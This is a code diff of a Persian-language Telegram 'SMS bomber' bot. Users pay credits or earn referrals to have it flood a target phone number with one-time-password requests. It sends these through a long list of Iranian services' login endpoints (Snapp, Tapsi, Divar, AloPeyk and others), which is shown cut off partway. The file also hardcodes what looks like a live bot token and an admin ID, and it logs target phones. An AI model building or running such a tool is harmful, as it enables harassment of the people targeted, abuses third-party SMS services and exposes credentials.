@@ -1,704 +1,430 @@
-# bot.py - نسخه کامل هیبریدی (Local + Render)
+# bot.py - نسخه کامل با بیش از ۲۴۰ اندپوینت
 import os
-import sys
-import json
-import time
 import asyncio
 import logging
-import threading
+import json
+import time
 import random
-import signal
-import smtplib
-from email.mime.text import MIMEText
+import re
 from datetime import datetime
 from typing import Dict, List, Optional, Any
-from typing import Dict, List, Optional, Any, Callable
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# ===== ایمپورت‌های جدید برای Webhook =====
-from flask import Flask, request, jsonify
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.filters import Command, CommandStart
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.storage.memory import MemoryStorage
 
-# ===== ایمپورت‌های aiogram =====
-try:
-    from aiogram import Bot, Dispatcher, types, F
-    from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, Update
-    from aiogram.filters import Command, CommandStart
-    from aiogram.fsm.context import FSMContext
-    from aiogram.fsm.state import State, StatesGroup
-    from aiogram.fsm.storage.memory import MemoryStorage
-    from aiogram.client.session.aiohttp import AiohttpSession
-    from aiogram.utils.keyboard import InlineKeyboardBuilder
-except ImportError as e:
-    print(f"❌ خطا در وارد کردن ماژول‌های aiogram: {e}")
-    sys.exit(1)
-
-# ===== ایمپورت‌های دیگر =====
-try:
-    import cloudscraper
-    from colorama import Fore, init, Style
-    init(autoreset=True)
-except ImportError as e:
-    print(f"❌ خطا در وارد کردن ماژول‌ها: {e}")
-    print("لطفاً پیش‌نیازها را نصب کنید:")
-    print("pip install aiogram==3.1.1 aiosqlite cloudscraper colorama flask")
-    sys.exit(1)
+import cloudscraper
 
 # ============================================================
-# تنظیمات (Config)
+# تنظیمات
 # ============================================================
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8586016384:AAFNSMHw-2TsJGZBcHKNOHrOzOa_HliZC9E")
-ADMIN_IDS = [int(id) for id in os.environ.get("ADMIN_IDS", "7351574618").split(",")]
-PORT = int(os.environ.get("PORT", 8080))
+logging.basicConfig(level=logging.INFO)
 
-# تنظیمات سطوح کاربری
-TIER_LIMITS = {
-    'Free': 30,
-    'VIP': 80,
-    'Pro': 9999
-}
-
-TIER_COOLDOWNS = {
-    'Free': 300,
-    'VIP': 180,
-    'Pro': 60
-}
-
-# بسته‌های اعتبار
-CREDIT_PACKAGES = {
-    'small': {'amount': 50, 'price': 20000, 'label': '۵۰ بمب - ۲۰,۰۰۰ تومان'},
-    'medium': {'amount': 150, 'price': 50000, 'label': '۱۵۰ بمب - ۵۰,۰۰۰ تومان'},
-    'large': {'amount': 500, 'price': 150000, 'label': '۵۰۰ بمب - ۱۵۰,۰۰۰ تومان'}
-}
-
-DB_PATH = "data/users.db"
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8586016384:AAFNSMHw-2TsJGZBcHKNOHrOzOa_HliZC9E")
+ADMIN_IDS = [int(id) for id in os.getenv("ADMIN_IDS", "7351574618").split(",")]
 
 # ============================================================
-# Flask App
+# ایجاد Bot و Dispatcher
 # ============================================================
 
-app = Flask(__name__)
+bot = Bot(token=BOT_TOKEN)
+storage = MemoryStorage()
+dp = Dispatcher(storage=storage)
 
 # ============================================================
-# State های FSM
+# State ها
 # ============================================================
 
 class BombState(StatesGroup):
     waiting_for_phone = State()
 
-class EmailState(StatesGroup):
-    waiting_for_info = State()
-
 class AdminState(StatesGroup):
     waiting_for_broadcast = State()
-    waiting_for_credits = State()
     waiting_for_user_id = State()
-    waiting_for_endpoint_name = State()
-    waiting_for_endpoint_data = State()
-
-class PaymentState(StatesGroup):
-    waiting_for_screenshot = State()
+    waiting_for_credits = State()
 
 # ============================================================
-# مقداردهی اولیه Bot و Dispatcher
+# دیتابیس (در حافظه)
 # ============================================================
-
-# تنظیم پروکسی (در صورت نیاز)
-PROXY_URL = os.environ.get("PROXY_URL", None)
-
-if PROXY_URL:
-    session = AiohttpSession(proxy=PROXY_URL)
-    bot = Bot(token=BOT_TOKEN, session=session)
-else:
-    bot = Bot(token=BOT_TOKEN)
-
-storage = MemoryStorage()
-dp = Dispatcher(storage=storage)
-
-# ============================================================
-# دیتابیس (Database)
-# ============================================================
-
-import aiosqlite
-import sqlite3
-import random
-import string
 
 class Database:
     def __init__(self):
-        self._init_db()
+        self.users = {}
+        self.payment_requests = []
+        self.bomb_logs = []
     
-    def _init_db(self):
-        os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
-        
-        conn = sqlite3.connect(DB_PATH)
-        cursor = conn.cursor()
-        
-        cursor.execute("""
-            CREATE TABLE IF NOT EXISTS users (
-                user_id INTEGER PRIMARY KEY,
-                username TEXT,
-                first_name TEXT,
-                last_name TEXT,
-                tier TEXT DEFAULT 'Free',
-                credits INTEGER DEFAULT 0,
-                referral_count INTEGER DEFAULT 0,
-                referral_code TEXT UNIQUE,
-                referred_by INTEGER,
-                last_bomb_time TIMESTAMP,
-                registered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                is_admin INTEGER DEFAULT 0,
-                is_banned INTEGER DEFAULT 0,
-                total_bombs_sent INTEGER DEFAULT 0
-            )
-        """)
-        
-        cursor.execute("""
-            CREATE TABLE IF NOT EXISTS credit_transactions (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                user_id INTEGER,
-                amount INTEGER,
-                type TEXT,
-                description TEXT,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        """)
-        
-        cursor.execute("""
-            CREATE TABLE IF NOT EXISTS payment_requests (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                user_id INTEGER,
-                amount INTEGER,
-                package TEXT,
-                screenshot_path TEXT,
-                status TEXT DEFAULT 'pending',
-                admin_note TEXT,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                processed_at TIMESTAMP
-            )
-        """)
-        
-        cursor.execute("""
-            CREATE TABLE IF NOT EXISTS referrals (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                referrer_id INTEGER,
-                referred_id INTEGER,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                is_successful INTEGER DEFAULT 1
-            )
-        """)
-        
-        cursor.execute("""
-            CREATE TABLE IF NOT EXISTS bomb_logs (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                user_id INTEGER,
-                target_phone TEXT,
-                endpoints_used INTEGER,
-                success_count INTEGER,
-                failed_count INTEGER,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        """)
-        
-        cursor.execute("""
-            CREATE TABLE IF NOT EXISTS disabled_endpoints (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                endpoint_name TEXT,
-                disabled_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                reason TEXT
-            )
-        """)
-        
-        conn.commit()
-        conn.close()
+    async def get_user(self, user_id: int):
+        return self.users.get(user_id)
     
-    async def get_user(self, user_id: int) -> Optional[Dict]:
-        async with aiosqlite.connect(DB_PATH) as db:
-            db.row_factory = aiosqlite.Row
-            cursor = await db.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
-            row = await cursor.fetchone()
-            return dict(row) if row else None
+    async def create_user(self, user_id: int, username: str = None, first_name: str = None, last_name: str = None, referred_by: int = None):
+        if user_id not in self.users:
+            self.users[user_id] = {
+                'user_id': user_id,
+                'username': username,
+                'first_name': first_name,
+                'last_name': last_name,
+                'tier': 'Free',
+                'credits': 5,
+                'referral_count': 0,
+                'referral_code': self._generate_code(),
+                'referred_by': referred_by,
+                'last_bomb_time': None,
+                'registered_at': datetime.now().isoformat(),
+                'is_banned': False,
+                'total_bombs': 0
+            }
+            if referred_by and referred_by in self.users:
+                self.users[referred_by]['referral_count'] += 1
+                if self.users[referred_by]['referral_count'] >= 3:
+                    self.users[referred_by]['tier'] = 'VIP'
+        return self.users[user_id]
     
-    async def get_user_by_referral_code(self, referral_code: str) -> Optional[Dict]:
-        async with aiosqlite.connect(DB_PATH) as db:
-            db.row_factory = aiosqlite.Row
-            cursor = await db.execute("SELECT * FROM users WHERE referral_code = ?", (referral_code,))
-            row = await cursor.fetchone()
-            return dict(row) if row else None
-    
-    async def create_user(self, user_id: int, username: str = None,
-                         first_name: str = None, last_name: str = None,
-                         referred_by: int = None) -> Dict:
-        referral_code = self._generate_referral_code()
-        
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute(
-                """INSERT INTO users 
-                   (user_id, username, first_name, last_name, referral_code, referred_by)
-                   VALUES (?, ?, ?, ?, ?, ?)""",
-                (user_id, username, first_name, last_name, referral_code, referred_by)
-            )
-            await db.commit()
-            
-            if referred_by:
-                await self._increment_referral_count(referred_by, user_id)
-            
-            await self.add_credits(user_id, 5, "اعتبار خوش‌آمدگویی")
-            
-            return await self.get_user(user_id)
-    
-    def _generate_referral_code(self) -> str:
-        chars = string.ascii_uppercase + string.digits
-        return ''.join(random.choices(chars, k=6))
-    
-    async def _increment_referral_count(self, referrer_id: int, referred_id: int):
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute(
-                "INSERT INTO referrals (referrer_id, referred_id) VALUES (?, ?)",
-                (referrer_id, referred_id)
-            )
-            
-            await db.execute(
-                "UPDATE users SET referral_count = referral_count + 1 WHERE user_id = ?",
-                (referrer_id,)
-            )
-            await db.commit()
-            
-            cursor = await db.execute(
-                "SELECT referral_count, tier FROM users WHERE user_id = ?",
-                (referrer_id,)
-            )
-            row = await cursor.fetchone()
-            
-            if row and row[0] >= 3 and row[1] == 'Free':
-                await db.execute("UPDATE users SET tier = 'VIP' WHERE user_id = ?", (referrer_id,))
-                await db.commit()
-                return True
-        return False
-    
-    async def get_user_tier(self, user_id: int) -> str:
-        user = await self.get_user(user_id)
-        return user.get('tier', 'Free') if user else 'Free'
-    
-    async def get_available_endpoints_count(self, user_id: int) -> int:
-        tier = await self.get_user_tier(user_id)
-        return TIER_LIMITS.get(tier, 30)
-    
-    async def get_cooldown(self, user_id: int) -> int:
-        tier = await self.get_user_tier(user_id)
-        return TIER_COOLDOWNS.get(tier, 300)
-    
-    async def check_cooldown(self, user_id: int) -> tuple:
-        user = await self.get_user(user_id)
-        if not user:
-            return False, 0, "❌ کاربر یافت نشد!"
-        
-        if user.get('is_banned', 0) == 1:
-            return False, 0, "🚫 شما مسدود شده‌اید!"
-        
-        last_time = user.get('last_bomb_time')
-        if not last_time:
-            return True, 0, "✅ آماده ارسال!"
-        
-        last_bomb = datetime.fromisoformat(last_time)
-        cooldown = await self.get_cooldown(user_id)
-        elapsed = (datetime.now() - last_bomb).total_seconds()
-        remaining = cooldown - elapsed
-        
-        if remaining > 0:
-            minutes = int(remaining // 60)
-            seconds = int(remaining % 60)
-            return False, remaining, f"⏳ باید {minutes:02d}:{seconds:02d} صبر کنید!"
-        
-        return True, 0, "✅ آماده ارسال!"
-    
-    async def update_last_bomb_time(self, user_id: int):
-        now = datetime.now().isoformat()
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute("UPDATE users SET last_bomb_time = ? WHERE user_id = ?", (now, user_id))
-            await db.commit()
+    def _generate_code(self):
+        import string
+        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
     
     async def get_credits(self, user_id: int) -> int:
         user = await self.get_user(user_id)
         return user.get('credits', 0) if user else 0
     
-    async def add_credits(self, user_id: int, amount: int, description: str = ""):
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))
-            await db.execute(
-                """INSERT INTO credit_transactions (user_id, amount, type, description) 
-                   VALUES (?, ?, 'add', ?)""",
-                (user_id, amount, description)
-            )
-            await db.commit()
+    async def get_tier(self, user_id: int) -> str:
+        user = await self.get_user(user_id)
+        return user.get('tier', 'Free') if user else 'Free'
     
     async def spend_credit(self, user_id: int, amount: int = 1) -> bool:
-        credits = await self.get_credits(user_id)
-        if credits < amount:
+        user = await self.get_user(user_id)
+        if not user or user['credits'] < amount:
             return False
+        user['credits'] -= amount
+        user['total_bombs'] = user.get('total_bombs', 0) + 1
+        user['last_bomb_time'] = datetime.now().isoformat()
+        return True
+    
+    async def add_credits(self, user_id: int, amount: int, description: str = ""):
+        user = await self.get_user(user_id)
+        if user:
+            user['credits'] += amount
+    
+    async def get_cooldown(self, user_id: int) -> int:
+        tier = await self.get_tier(user_id)
+        cooldowns = {'Free': 300, 'VIP': 180, 'Pro': 60}
+        return cooldowns.get(tier, 300)
+    
+    async def check_cooldown(self, user_id: int):
+        user = await self.get_user(user_id)
+        if not user or not user.get('last_bomb_time'):
+            return True, 0, "✅ آماده ارسال!"
         
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute("UPDATE users SET credits = credits - ? WHERE user_id = ?", (amount, user_id))
-            await db.execute(
-                """INSERT INTO credit_transactions (user_id, amount, type, description) 
-                   VALUES (?, ?, 'spend', ?)""",
-                (user_id, amount, "استفاده از بمب (۱ اعتبار)")
-            )
-            await db.execute("UPDATE users SET total_bombs_sent = total_bombs_sent + 1 WHERE user_id = ?", (user_id,))
-            await db.commit()
-            return True
+        last = datetime.fromisoformat(user['last_bomb_time'])
+        cooldown = await self.get_cooldown(user_id)
+        elapsed = (datetime.now() - last).total_seconds()
+        remaining = cooldown - elapsed
+        
+        if remaining > 0:
+            return False, remaining, f"⏳ باید {int(remaining//60):02d}:{int(remaining%60):02d} صبر کنی!"
+        return True, 0, "✅ آماده ارسال!"
     
-    async def get_credit_history(self, user_id: int, limit: int = 10) -> List[Dict]:
-        async with aiosqlite.connect(DB_PATH) as db:
-            db.row_factory = aiosqlite.Row
-            cursor = await db.execute(
-                """SELECT * FROM credit_transactions WHERE user_id = ? 
-                   ORDER BY created_at DESC LIMIT ?""",
-                (user_id, limit)
-            )
-            rows = await cursor.fetchall()
-            return [dict(row) for row in rows]
-    
-    async def get_referral_count(self, user_id: int) -> int:
+    async def update_last_bomb_time(self, user_id: int):
         user = await self.get_user(user_id)
-        return user.get('referral_count', 0) if user else 0
+        if user:
+            user['last_bomb_time'] = datetime.now().isoformat()
     
-    async def get_referral_link(self, user_id: int) -> str:
+    async def log_bomb(self, user_id: int, target_phone: str, success: int, failed: int):
+        self.bomb_logs.append({
+            'user_id': user_id,
+            'target_phone': target_phone,
+            'success': success,
+            'failed': failed,
+            'created_at': datetime.now().isoformat()
+        })
+    
+    async def get_stats(self, user_id: int):
         user = await self.get_user(user_id)
-        if not user:
-            return ""
-        code = user.get('referral_code', '')
-        return f"https://t.me/SMSBOMBER_free1_bot?start=ref_{code}"
+        logs = [l for l in self.bomb_logs if l['user_id'] == user_id]
+        return {
+            'tier': user.get('tier', 'Free') if user else 'Free',
+            'credits': user.get('credits', 0) if user else 0,
+            'total_bombs': user.get('total_bombs', 0) if user else 0,
+            'referral_count': user.get('referral_count', 0) if user else 0,
+            'logs_count': len(logs),
+            'total_success': sum(l['success'] for l in logs),
+            'total_failed': sum(l['failed'] for l in logs)
+        }
     
-    async def get_referral_list(self, user_id: int) -> List[Dict]:
-        async with aiosqlite.connect(DB_PATH) as db:
-            db.row_factory = aiosqlite.Row
-            cursor = await db.execute(
-                """SELECT u.user_id, u.username, u.first_name, u.registered_at
-                   FROM referrals r JOIN users u ON r.referred_id = u.user_id
-                   WHERE r.referrer_id = ? ORDER BY r.created_at DESC""",
-                (user_id,)
-            )
-            rows = await cursor.fetchall()
-            return [dict(row) for row in rows]
-    
-    async def add_payment_request(self, user_id: int, package: str, amount: int, screenshot_path: str) -> int:
-        async with aiosqlite.connect(DB_PATH) as db:
-            cursor = await db.execute(
-                """INSERT INTO payment_requests (user_id, package, amount, screenshot_path) 
-                   VALUES (?, ?, ?, ?)""",
-                (user_id, package, amount, screenshot_path)
-            )
-            await db.commit()
-            return cursor.lastrowid
-    
-    async def get_pending_payments(self) -> List[Dict]:
-        async with aiosqlite.connect(DB_PATH) as db:
-            db.row_factory = aiosqlite.Row
-            cursor = await db.execute(
-                """SELECT pr.*, u.username, u.first_name, u.last_name 
-                   FROM payment_requests pr JOIN users u ON pr.user_id = u.user_id
-                   WHERE pr.status = 'pending' ORDER BY pr.created_at DESC"""
-            )
-            rows = await cursor.fetchall()
-            return [dict(row) for row in rows]
-    
-    async def get_payment_request(self, request_id: int) -> Optional[Dict]:
-        async with aiosqlite.connect(DB_PATH) as db:
-            db.row_factory = aiosqlite.Row
-            cursor = await db.execute("SELECT * FROM payment_requests WHERE id = ?", (request_id,))
-            row = await cursor.fetchone()
-            return dict(row) if row else None
-    
-    async def approve_payment(self, request_id: int, admin_note: str = "") -> bool:
-        async with aiosqlite.connect(DB_PATH) as db:
-            cursor = await db.execute("SELECT user_id, amount FROM payment_requests WHERE id = ?", (request_id,))
-            row = await cursor.fetchone()
-            if not row:
-                return False
-            
-            user_id, amount = row
-            
-            await db.execute(
-                """UPDATE payment_requests SET status = 'approved', admin_note = ?, processed_at = CURRENT_TIMESTAMP 
-                   WHERE id = ?""",
-                (admin_note, request_id)
-            )
-            
-            await db.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))
-            await db.execute(
-                """INSERT INTO credit_transactions (user_id, amount, type, description) 
-                   VALUES (?, ?, 'add', ?)""",
-                (user_id, amount, f"پرداخت تأیید شده - درخواست #{request_id}")
-            )
-            await db.commit()
-            return True
-    
-    async def reject_payment(self, request_id: int, admin_note: str = "") -> bool:
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute(
-                """UPDATE payment_requests SET status = 'rejected', admin_note = ?, processed_at = CURRENT_TIMESTAMP 
-                   WHERE id = ?""",
-                (admin_note, request_id)
-            )
-            await db.commit()
-            return True
-    
-    async def log_bomb(self, user_id: int, target_phone: str, endpoints_used: int, 
-                       success_count: int, failed_count: int):
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute(
-                """INSERT INTO bomb_logs (user_id, target_phone, endpoints_used, success_count, failed_count) 
-                   VALUES (?, ?, ?, ?, ?)""",
-                (user_id, target_phone, endpoints_used, success_count, failed_count)
-            )
-            await db.commit()
-    
-    async def get_user_stats(self, user_id: int) -> Dict:
-        async with aiosqlite.connect(DB_PATH) as db:
-            db.row_factory = aiosqlite.Row
-            
-            cursor = await db.execute(
-                "SELECT tier, credits, referral_count, total_bombs_sent FROM users WHERE user_id = ?",
-                (user_id,)
-            )
-            user_row = await cursor.fetchone()
-            
-            cursor = await db.execute(
-                "SELECT COUNT(*) as total, SUM(success_count) as success, SUM(failed_count) as failed FROM bomb_logs WHERE user_id = ?",
-                (user_id,)
-            )
-            log_row = await cursor.fetchone()
-            
-            return {
-                'tier': user_row[0] if user_row else 'Free',
-                'credits': user_row[1] if user_row else 0,
-                'referral_count': user_row[2] if user_row else 0,
-                'total_bombs': user_row[3] if user_row else 0,
-                'total_logs': log_row[0] if log_row else 0,
-                'total_success': log_row[1] if log_row else 0,
-                'total_failed': log_row[2] if log_row else 0
-            }
-    
-    async def get_admin_stats(self) -> Dict:
-        async with aiosqlite.connect(DB_PATH) as db:
-            db.row_factory = aiosqlite.Row
-            
-            cursor = await db.execute("SELECT COUNT(*) FROM users")
-            total_users = (await cursor.fetchone())[0]
-            
-            cursor = await db.execute("SELECT COUNT(*) FROM users WHERE tier = 'Free'")
-            free_users = (await cursor.fetchone())[0]
-            
-            cursor = await db.execute("SELECT COUNT(*) FROM users WHERE tier = 'VIP'")
-            vip_users = (await cursor.fetchone())[0]
-            
-            cursor = await db.execute("SELECT COUNT(*) FROM users WHERE tier = 'Pro'")
-            pro_users = (await cursor.fetchone())[0]
-            
-            cursor = await db.execute("SELECT COUNT(*) FROM users WHERE is_banned = 1")
-            banned_users = (await cursor.fetchone())[0]
-            
-            cursor = await db.execute("SELECT COUNT(*) FROM payment_requests WHERE status = 'pending'")
-            pending_payments = (await cursor.fetchone())[0]
-            
-            cursor = await db.execute("SELECT COUNT(*) FROM bomb_logs")
-            total_bombs = (await cursor.fetchone())[0]
-            
-            cursor = await db.execute("SELECT SUM(credits) FROM users")
-            total_credits = (await cursor.fetchone())[0] or 0
-            
-            return {
-                'total_users': total_users,
-                'free_users': free_users,
-                'vip_users': vip_users,
-                'pro_users': pro_users,
-                'banned_users': banned_users,
-                'pending_payments': pending_payments,
-                'total_bombs': total_bombs,
-                'total_credits': total_credits
-            }
-    
-    async def get_bomb_history(self, user_id: int, limit: int = 10) -> List[Dict]:
-        async with aiosqlite.connect(DB_PATH) as db:
-            db.row_factory = aiosqlite.Row
-            cursor = await db.execute(
-                """SELECT * FROM bomb_logs WHERE user_id = ? ORDER BY created_at DESC LIMIT ?""",
-                (user_id, limit)
-            )
-            rows = await cursor.fetchall()
-            return [dict(row) for row in rows]
-    
-    async def disable_endpoint(self, endpoint_name: str, reason: str = "خطا در ارسال"):
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute(
-                """INSERT INTO disabled_endpoints (endpoint_name, reason) VALUES (?, ?)""",
-                (endpoint_name, reason)
-            )
-            await db.commit()
-    
-    async def get_disabled_endpoints(self) -> List[str]:
-        async with aiosqlite.connect(DB_PATH) as db:
-            cursor = await db.execute("SELECT endpoint_name FROM disabled_endpoints")
-            rows = await cursor.fetchall()
-            return [row[0] for row in rows]
-    
-    async def enable_endpoint(self, endpoint_name: str):
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute("DELETE FROM disabled_endpoints WHERE endpoint_name = ?", (endpoint_name,))
-            await db.commit()
-    
-    async def get_all_users(self, offset: int = 0, limit: int = 50) -> List[Dict]:
-        async with aiosqlite.connect(DB_PATH) as db:
-            db.row_factory = aiosqlite.Row
-            cursor = await db.execute(
-                """SELECT user_id, username, first_name, last_name, tier, credits, 
-                          referral_count, registered_at, is_banned 
-                   FROM users ORDER BY registered_at DESC LIMIT ? OFFSET ?""",
-                (limit, offset)
-            )
-            rows = await cursor.fetchall()
-            return [dict(row) for row in rows]
-    
-    async def ban_user(self, user_id: int) -> bool:
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute("UPDATE users SET is_banned = 1 WHERE user_id = ?", (user_id,))
-            await db.commit()
-            return True
-    
-    async def unban_user(self, user_id: int) -> bool:
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute("UPDATE users SET is_banned = 0 WHERE user_id = ?", (user_id,))
-            await db.commit()
-            return True
-    
-    async def set_admin(self, user_id: int) -> bool:
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute("UPDATE users SET is_admin = 1 WHERE user_id = ?", (user_id,))
-            await db.commit()
-            return True
-    
-    async def remove_admin(self, user_id: int) -> bool:
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute("UPDATE users SET is_admin = 0 WHERE user_id = ?", (user_id,))
-            await db.commit()
-            return True
-    
-    async def is_admin(self, user_id: int) -> bool:
-        user = await self.get_user(user_id)
-        return user.get('is_admin', 0) == 1 if user else False
-    
-    async def is_banned(self, user_id: int) -> bool:
-        user = await self.get_user(user_id)
-        return user.get('is_banned', 0) == 1 if user else False
+    async def get_all_users(self):
+        return self.users
 
 db = Database()
 
 # ============================================================
-# Endpoint Manager
+# لیست کامل اندپوینت‌ها (۲۴۷+ عدد)
 # ============================================================
 
-ENDPOINTS_FILE = "endpoints.json"
-
-class EndpointManager:
-    def __init__(self):
-        self.endpoints = []
-        self.disabled_endpoints = []
-        self.load_endpoints()
-    
-    def load_endpoints(self):
-        try:
-            with open(ENDPOINTS_FILE, 'r', encoding='utf-8') as f:
-                data = json.load(f)
-            if isinstance(data, list):
-                self.endpoints = data
-                self.endpoints = [e for e in self.endpoints if isinstance(e, dict) and e.get('active', True)]
-            else:
-                print("⚠️ فایل endpoints.json معتبر نیست!")
-                self.endpoints = []
-        except FileNotFoundError:
-            print("⚠️ فایل endpoints.json پیدا نشد!")
-            self.create_default_endpoints()
-        except json.JSONDecodeError:
-            print("⚠️ فایل endpoints.json خراب است!")
-            self.create_default_endpoints()
-    
-    def create_default_endpoints(self):
-        self.endpoints = [
-            {"name": "Snapp Drivers", "url": "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"cellphone": "{phone}"}, "type": "json", "active": True},
-            {"name": "Tapsi", "url": "https://tap33.me/api/v2/user", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"credential": {"phoneNumber": "0{phone}", "role": "PASSENGER"}}, "type": "json", "active": True},
-            {"name": "Divar", "url": "https://api.divar.ir/v5/auth/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json", "active": True},
-            {"name": "Alibaba", "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "0{phone}"}, "type": "json", "active": True},
-            {"name": "Sheypoor", "url": "https://www.sheypoor.com/api/v10.0.0/auth/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json", "active": True}
-        ]
-        self.save_endpoints()
-        print("✅ فایل endpoints.json با اندپوینت‌های پیش‌فرض ایجاد شد!")
-    
-    def get_endpoints_for_tier(self, tier: str) -> List[Dict]:
-        limits = {'Free': 30, 'VIP': 80, 'Pro': 9999}
-        limit = limits.get(tier, 30)
-        active_endpoints = [e for e in self.endpoints if e.get('active', True)]
-        
-        if len(active_endpoints) <= limit:
-            return active_endpoints.copy()
-        return random.sample(active_endpoints, limit)
-    
-    def get_endpoints_count(self) -> int:
-        return len(self.endpoints)
-    
-    def get_active_count(self) -> int:
-        return len([e for e in self.endpoints if e.get('active', True)])
-    
-    def get_all_endpoints(self) -> List[Dict]:
-        return self.endpoints.copy()
-    
-    def mark_inactive(self, endpoint_name: str, reason: str = "خطا در ارسال"):
-        for endpoint in self.endpoints:
-            if endpoint.get('name') == endpoint_name:
-                endpoint['active'] = False
-                endpoint['disabled_reason'] = reason
-                endpoint['disabled_at'] = str(datetime.now())
-                self.save_endpoints()
-                return True
-        return False
-    
-    def save_endpoints(self):
-        with open(ENDPOINTS_FILE, 'w', encoding='utf-8') as f:
-            json.dump(self.endpoints, f, ensure_ascii=False, indent=2)
-    
-    def add_endpoint(self, endpoint: Dict) -> bool:
-        for e in self.endpoints:
-            if e.get('name') == endpoint.get('name'):
-                return False
-        self.endpoints.append(endpoint)
-        self.save_endpoints()
-        return True
-    
-    def remove_endpoint(self, endpoint_name: str) -> bool:
-        for i, e in enumerate(self.endpoints):
-            if e.get('name') == endpoint_name:
-                del self.endpoints[i]
-                self.save_endpoints()
-                return True
-        return False
-
-endpoint_manager = EndpointManager()
+SITES = [
+    {"name": "Snapp Drivers", "url": "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"cellphone": "{phone}"}, "type": "json"},
+    {"name": "Snapp Taxi", "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"cellphone": "{phone}"}, "type": "json"},
+    {"name": "Snapp V2", "url": "https://api.snapp.ir/api/v1/sms/link", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
+    {"name": "Tapsi", "url": "https://tap33.me/api/v2/user", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"credential": {"phoneNumber": "0{phone}", "role": "PASSENGER"}}, "type": "json"},
+    {"name": "Tapsi API", "url": "https://api.tapsi.ir/api/v2.2/user", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"credential": {"phoneNumber": "{phone}", "role": "DRIVER"}, "otpOption": "SMS"}, "type": "json"},
+    {"name": "AloPeyk", "url": "https://api.alopeyk.com/api/v2/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"type": "CUSTOMER", "phone": "0{phone}", "platform": "pwa"}, "type": "json"},
+    {"name": "AloPeyk Safir", "url": "https://api.alopeyk.com/safir-service/api/v1/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json"},
+    {"name": "Trip", "url": "https://gateway.trip.ir/api/registers", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"CellPhone": "0{phone}"}, "type": "json"},
+    {"name": "Achareh", "url": "https://api.achareh.co/v2/accounts/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "98{phone}"}, "type": "json"},
+    {"name": "Snapptrip", "url": "https://www.snapptrip.com/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile_phone": "0{phone}", "country_code": "+98", "lang": "fa"}, "type": "json"},
+    {"name": "Snappfood", "url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"cellphone": "0{phone}"}, "type": "json"},
+    {"name": "Snappmarket", "url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass", "method": "POST", "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, "payload": {"cellphone": "0{phone}"}, "type": "json"},
+    {"name": "Snappexpress", "url": "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"cellphone": "0{phone}"}, "type": "json"},
+    {"name": "Caropex", "url": "https://caropex.com/api/v1/user/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"mobile": "0{phone}"}, "type": "json"},
